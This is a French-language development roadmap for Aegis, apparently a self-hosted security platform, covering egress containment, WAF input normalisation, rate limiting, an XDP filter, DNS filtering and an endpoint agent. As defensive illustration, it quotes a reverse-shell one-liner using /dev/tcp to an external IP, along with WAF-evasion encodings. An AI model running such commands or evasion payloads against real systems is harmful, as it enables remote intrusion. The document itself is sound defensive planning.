# 🛡️ Roadmap Technique Aegis — Durcissement Pré-Production VPS & Lancement Public

<p align="center">
  <a href="ROADMAP.md">English</a> | <strong>Français</strong>
</p>

Ce document consigne les **verrous techniques prioritaires** identifiés lors de l'audit d'efficacité d'Aegis, de l'analyse des menaces critiques récentes (RCE mémoire, failles kernel réseau, rebond via postes de télémaintenance) et des architectures réelles en entreprise. 

L'objectif est d'assurer une **défense en profondeur souveraine et frugale** : porter le taux de neutralisation face aux attaquants ciblés de **~78 % à > 95 %**, protéger les serveurs critiques même en cas de compromission d'un poste bureautique (*paradigme Assume Breach*), et offrir une visibilité de posture endpoint sans surcoût par siège.

---

## 🧭 Matrice des Priorités de Développement

| Verrou / Module | Priorité | Domaine | Gain Majeur |
| :--- | :--- | :--- | :--- |
| **Verrou n°1 : Confinement Egress Réseau** | **P0 (Critique)** | Infrastructure Docker / Egress | Bloque 98 % des Reverse-Shells par IP directe brute |
| **Verrou n°2 : Normalisation Multi-Encodage** | **P1 (Haute)** | Ingress WAF (`gate-proxy`) | Bloque les évasions d'inspection (Unicode, Hex, Base64) |
| **Verrou n°3 : Rate-Limiting & Quarantaine IP** | **P1 (Haute)** | Ingress WAF (`gate-proxy`) | Neutralise le brute-force et le fuzzing automatisé |
| **Verrou n°4 : Virtual Patching Mémoire (PHP2Shell)** | **P1 (Haute)** | Ingress WAF & Agent Hôte | Rejette les saturations OOM HTTP & anti-spawn de shell |
| **Verrou n°5 : Filtre Réseau eBPF/XDP L3/L4 (Kernel UAF)**| **P2 (Moyenne)** | Sonde Rust & Kernel Hôte | Rejette les paquets SYN malveillants avant le noyau Linux |
| **Verrou n°6 : Filtrage DNS Entreprise & Shadow IT** | **P2 (Moyenne)** | Egress Gateway (DHCP / DoH) | Bloque l'exfiltration C2 et encadre les outils de télémaintenance |
| **Verrou n°7 : Agent de Posture Endpoint Frugal Rust** | **P2 (Moyenne)** | Endpoint multiplateforme & SOC | Inventaire local des failles CVE (< 10 Mo RAM) & accès conditionnel |
| **Verrou n°8 : Micro-Segmentation ZTNA Assume Breach** | **P2 (Moyenne)** | Architecture Réseau & PEP | Isole les serveurs critiques des postes de travail bureautiques |

---

## 🔒 Verrou n°1 : Isolation Réseau Stricte & Confinement Egress (Anti-Reverse Shell par IP brute)
- **Statut :** ⏳ À implémenter
- **Priorité :** Critique (P0 — Avant exposition VPS public)
- **Gain d'efficacité Egress :** **+35 %** (passe de 0 % à ~98 % sur les Reverse Shells TCP vers IP codée en dur sans résolution DNS)
- **Problème actuel :**
  La passerelle `apps/egress-gateway/src/index.mjs` intercepte les requêtes DNS UDP/TCP sur le port `:5053` et les inspections explicites sur `/inspect`. Cependant, dans `docker-compose.yml`, si un processus compromis dans `aegis_backend` exécute un appel système `connect()` direct vers une IP externe en dur (ex: `/bin/sh -i >& /dev/tcp/185.220.101.99/4444`) sans effectuer de requête DNS préalable, le paquet TCP sort directement par l'interface bridge Docker par défaut.
- **Plan d'action technique :**
  1. Créer dans `docker-compose.yml` un réseau Docker isolé `aegis_internal_sandbox` configuré avec `internal: true` (aucune route par défaut vers Internet).
  2. Attacher `aegis_backend` et `aegis_timescaledb` **exclusivement** à ce réseau interne `aegis_internal_sandbox`.
  3. Attacher `aegis_gate_proxy` et `aegis_egress_gateway` à la fois au réseau interne `aegis_internal_sandbox` et au réseau externe `aegis_net`.
  4. Forcer le résolveur DNS de `aegis_backend` vers l'IP fixe d'`aegis_egress_gateway` (`:5053`).
  5. *(Phase 2 Linux Host / Bare-Metal)* : Attacher un programme eBPF `cgroup/connect4` (`sys_enter_connect`) qui bloque au niveau du Kernel tout socket sortant dont l'IP de destination n'a pas été préalablement résolue et autorisée (TTL 60s) par `aegis-egress-gateway`.

---

## 🔒 Verrou n°2 : Normalisation Multi-Encodage Anti-Obfuscation dans `gate-proxy`
- **Statut :** ⏳ À implémenter
- **Priorité :** Haute (P1)
- **Gain d'efficacité Ingress :** **+12 % à +15 %** face aux contournements WAF manuels
- **Problème actuel :**
  La fonction `inspectRequest()` dans `apps/gate-proxy/src/index.mjs` effectue une seule passe `decodeURIComponent(req.url)`. Un attaquant humain utilisant du double encodage URL (`%252e%252e%252f`), des commentaires SQL intercalés (`UN/**/ION SEL/**/ECT`), des entités HTML/Unicode ou de l'encodage Base64/Hex dans le corps de requête peut contourner les expressions régulières statiques.
- **Plan d'action technique :**
  1. Implémenter un pipeline de canonisation `canonicalizeInput(raw)` dans `apps/gate-proxy/src/index.mjs` exécuté avant l'évaluation des règles :
     - Décodage URL récursif (jusqu'à 3 passes tant que `%[0-9a-fA-F]{2}` est présent).
     - Suppression des octets nuls (`%00`, `\0`) et normalisation des chemins (`/./`, `//`, `\`).
     - Suppression des commentaires d'évasion SQL (`/*...*/`, `/*!50000...*/`) et réduction des espaces multiples.
     - Décodage automatique des blocs Base64 suspects (> 16 caractères) détectés dans les paramètres de requête ou headers pour les soumettre aux mêmes règles `ZERODAY_EXPLOIT_REGEX`, `RCE_REGEX` et `SQLI_REGEX`.

---

## 🔒 Verrou n°3 : Rate-Limiting & Bannissement Dynamique par IP (Anti-Fuzzing / Brute-Force)
- **Statut :** ⏳ À implémenter
- **Priorité :** Haute (P1)
- **Gain d'efficacité Globale :** Bloque **99 %** des attaques multi-essais et du fuzzing de contournement
- **Problème actuel :**
  Lorsqu'une IP déclenche un blocage `403` ou `413` sur `apps/gate-proxy/src/index.mjs`, seule la requête courante est rejetée. L'attaquant peut immédiatement envoyer des milliers de mutations par seconde depuis la même IP pour tenter de trouver un payload qui passe sous le radar.
- **Plan d'action technique :**
  1. Ajouter dans `apps/gate-proxy/src/index.mjs` un registre mémoire `ipReputationMap` (avec nettoyage périodique TTL) :
     - **Seuil de ban immédiat (`Jail`)** : Dès qu'une IP source cumule **3 alertes critiques** (`risk_score >= 90`) en moins de 5 minutes, l'IP est placée en quarantaine pendant **15 minutes** (rejet immédiat en `< 0.1 ms` avec HTTP `429 / 403` avant même l'analyse du payload).
     - **Rate-Limiting volumétrique** : Limiter chaque IP à max `60 requêtes / 10 secondes` sur les routes dynamiques pour neutraliser le brute-force d'authentification et les attaques logiques (IDOR scraping).
  2. Exposer la liste des IP bannies et un bouton de déblocage dans le Cockpit (`AegisUnifiedCockpit.vue`) et réinitialiser ce registre lors d'un appel à `POST /api/v1/dashboard/reset`.

---

## 🔒 Verrou n°4 : Virtual Patching Ingress & Anti-Corruption Mémoire (Protection PHP2Shell CVE-2026-109618 & CVE-2026-109619)
- **Statut :** ⏳ À implémenter
- **Priorité :** Haute (P1)
- **Gain d'efficacité Ingress Applicatif :** Neutralise les tentatives d'exploitation de saturation mémoire OOM et de désynchronisation d'état des workers PHP-FPM en amont
- **Contexte & Risque :**
  Les vulnérabilités critiques PHP Core **CVE-2026-109618** (OOM `longjmp` non initialisé) et **CVE-2026-109619** (Use-After-Free / persistance d'états zombies entre requêtes successives) permettent une RCE non authentifiée via des requêtes HTTP forgées (multiparts anormaux, en-têtes surdimensionnés, flooding d'allocations).
- **Plan d'action technique :**
  1. **Durcissement protocolaire dans `gate-proxy`** :
     - Rejet strict des requêtes avec en-têtes HTTP anormaux (> 8 Ko au global ou > 4 Ko par en-tête individuel).
     - Validation de conformité RFC stricte des délimiteurs `multipart/form-data` (rejet des imbrications excessives > 3 niveaux et des chaînes de frontière corrompues).
     - Plafonnement strict des requêtes en `Transfer-Encoding: chunked` et contrôle des ratios de compression (anti-decompression bomb).
  2. **Surveillance d'anti-spawn de shell (Défense en profondeur)** :
     - Étendre la sonde locale pour détecter en temps réel l'instanciation de shells (`/bin/sh`, `/bin/bash`, `python`) issus de daemons web ou d'exécuteurs de code (`php-fpm`, `node`, `nginx`).
  3. **Synergie avec le Verrou n°1 (Confinement Egress)** :
     - Si un 0-day mémoire franchissait l'interpréteur, le blocage des connexions directes par IP brute empêche tout reverse-shell et toute fuite de variables d'environnement.

---

## 🔒 Verrou n°5 : Filtre Réseau eBPF / XDP L3/L4 & Veille Kernel Hôte (Protection UAF TCP CVE-2026-98432)
- **Statut :** ⏳ En conception
- **Priorité :** Moyenne (P2 — Phase 2 Linux Host / Bare-Metal)
- **Gain d'efficacité Infrastructure :** Protection de la pile TCP/IP du noyau Linux hôte contre les paquets SYN malveillants avant traitement par l'OS
- **Contexte & Risque :**
  La faille **CVE-2026-98432** (CVSS 9.8) affecte la fonction kernel `tcp_v4_syn_recv_sock()` lors du 3-way handshake IPv4 lorsque des paquets SYN contiennent des options IP malveillantes (LSRR/SSRR), provoquant un Use-After-Free de bas niveau (crash de l'hôte ou compromission kernel).
- **Plan d'action technique :**
  1. **Filtre eBPF / XDP Ingress (Module Rust)** :
     - Étendre `apps/telemetry-agent` pour charger un programme eBPF de type `xdp` (eXpress Data Path) au niveau du pilote de la carte réseau.
     - Rejeter instantanément (`XDP_DROP`) en `< 0.005 ms` tout paquet TCP SYN comportant des options IP IPv4 obsolètes ou dangereuses (`IPOPT_LSRR`, `IPOPT_SSRR`, `IPOPT_RR`) avant leur transmission au sous-système réseau du noyau.
  2. **Audit de vulnérabilité Kernel dans le Cockpit SOC** :
     - Lecture automatisée par la sonde de la version du noyau hôte (`uname -r`).
     - Affichage d'une tuile d'alerte prioritaire dans le Cockpit si le kernel hôte est dans une version vulnérable avec suggestion de commande de mise à jour sécurisée.

---

## 🔒 Verrou n°6 : Filtrage DNS d'Entreprise Centralisé & Détection Shadow IT (Famille TeamViewer CVE-2026-92372, 92370, 19042)
- **Statut :** ⏳ À planifier
- **Priorité :** Moyenne (P2)
- **Gain d'efficacité Périmétrique :** Élimine le risque d'exfiltration C2 et régule les solutions de prise en main à distance sans inspection lourde de flux chiffrés
- **Contexte & Déploiement Réseau Entreprise :**
  Plutôt que d'obliger l'ensemble du trafic web d'entreprise à transiter par une passerelle centrale (ce qui saturerait la bande passante et détruirait la frugalité), Aegis Egress opère comme le **résolveur DNS souverain d'entreprise** :
  - Sur site : distribué par le serveur DHCP local sur le port `:5053`.
  - En télétravail : activable via profil sécurisé DoH (DNS-over-HTTPS) ou DoT (DNS-over-TLS).
- **Plan d'action technique :**
  1. **Catégorisation des flux Remote Access Tools (RAT) dans `egress-gateway`** :
     - Identifier et classifier les domaines et ports standards des solutions de prise en main à distance (TeamViewer, AnyDesk, RustDesk, LogMeIn, VNC).
     - Offrir aux administrateurs une politique granulaire : *« Interdire tout flux de télémaintenance sortant depuis la DMZ et les serveurs de bases de données »*.
  2. **Neutralisation du pivotement latéral et des implants C2** :
     - Si un attaquant exploite un poste client via chat URL (CVE-2026-19042) pour installer un implant (Sliver, Cobalt Strike), le composant `egress-gateway` bloque la résolution de son domaine C2 via l'IA locale Nimble 9B et le sinkhole DNS.
     - Les serveurs internes protégés par `gate-proxy` exigent une authentification stricte, interdisant tout accès non authentifié depuis le sous-réseau bureautique.

---

## 🖥️ Verrou n°7 : Agent de Posture Endpoint Frugal en Rust (< 10 Mo RAM) & Intégration Cockpit SOC
- **Statut :** ⏳ En conception
- **Priorité :** Moyenne (P2 — Module Endpoint & ZTNA)
- **Gain d'efficacité Endpoint :** Détection proactive des vulnérabilités locales sur les postes de travail (Windows, macOS, Linux) sans abonnement par siège ni lourdeur d'un EDR propriétaire
- **Contexte & Philosophie :**
  Les solutions EDR traditionnelles (CrowdStrike, SentinelOne) consomment 1 à 2 Go de RAM par machine et coûtent jusqu'à 50 €/poste/mois. Aegis propose une alternative frugale : un agent natif compilé en Rust (< 10 Mo RAM, 0 % CPU en veille) agissant comme une sonde d'intégrité et de posture.
- **Plan d'action technique :**
  1. **Binaire autonome Rust multiplateforme (`aegis-node-agent`)** :
     - Service d'arrière-plan sans dépendance externe pour Linux (systemd), macOS (launchd) et Windows (service natif).
     - Consommation mémoire garantie inférieure à 10 Mo RAM.
  2. **Inventaire local & Détection de vulnérabilités logicielles** :
     - Analyse locale des versions des applications installées (ex. détection immédiate de TeamViewer `< 15.83` vulnérable à `CVE-2026-19042`, navigateurs obsolètes, failles OpenSSL/sudo).
     - Vérification de l'hygiène de base du poste : chiffrement disque activé (BitLocker/FileVault/LUKS), pare-feu local actif, OS à jour.
  3. **Heartbeat mTLS & Remontée dans le Cockpit SOC** :
     - Transmission périodique (toutes les 15 minutes ou sur événement) d'un bilan de conformité JSON chiffré vers l'API Go (`POST /api/v1/endpoints/posture`).
     - **Vue Flotte dans le Cockpit Aegis (`apps/web`)** : tableau de bord listant les postes de l'entreprise, leur score de santé et les alertes de patchs urgents à appliquer.
  4. **Contrôle d'accès conditionnel Zero-Trust (Device Posture Check)** :
     - Couplage direct avec `aegis-gate-proxy` : si un poste utilisateur présente une faille critique non corrigée (ex. TeamViewer non patché), Aegis Gate peut refuser ou restreindre son accès aux applications métier internes jusqu'à mise en conformité.

---

## 🛡️ Verrou n°8 : Micro-Segmentation ZTNA « Assume Breach » & Confinement Réseau Interne
- **Statut :** ⏳ En conception
- **Priorité :** Moyenne (P2)
- **Gain d'efficacité Réseau :** Empêche tout mouvement latéral vers les ressources sensibles en cas de compromission d'un poste utilisateur
- **Contexte & Philosophie :**
  En cybersécurité moderne, la règle d'or est d'assumer qu'un poste bureautique peut être compromis à tout instant (phishing, clé USB, faille applicative 0-day). La sécurité ne doit jamais reposer sur la confiance aveugle du réseau local.
- **Plan d'action technique :**
  1. **Suppression des accès L3 directs vers le cœur de données** :
     - Les postes bureautiques et le Wi-Fi invités sont cloisonnés dans des VLANs distincts n'ayant aucune connectivité IP directe vers les bases de données (PostgreSQL, TimescaleDB, ERP, etc.).
  2. **Point de passage unique via Aegis Gate (PEP L7)** :
     - Tout accès aux données et applications internes s'effectue exclusivement au travers d'Aegis Gate avec authentification forte (MFA, mTLS) et inspection in-line des requêtes.
  3. **Détection du balayage réseau (Honeypot interne)** :
     - Intégrer un module de détection de scan ARP/port dans l'agent hôte pour lever une alerte critique immédiate si un poste bureautique commence à sonder les IP du sous-réseau serveur.

---

## 📊 Enrichissement Continu du Cache CTI & Renseignement sur la Menace (Phase P2/P3)
- **Statut :** ⏳ En cours
- **Priorité :** P2
- **Objectifs :**
  - Chargement automatisé au démarrage d'une liste consolidée de domaines C2 actifs et nœuds de rebond (flux open-source Abuse.ch URLhaus / ThreatFox / CERT-FR / CISA KEV) dans `apps/egress-gateway/src/index.mjs` (recherche en `O(1)` < 0.05 ms, RAM < 5 Mo).
  - Intégration des flux de menaces pour l'apprentissage du modèle SLM Nimble 9B local.
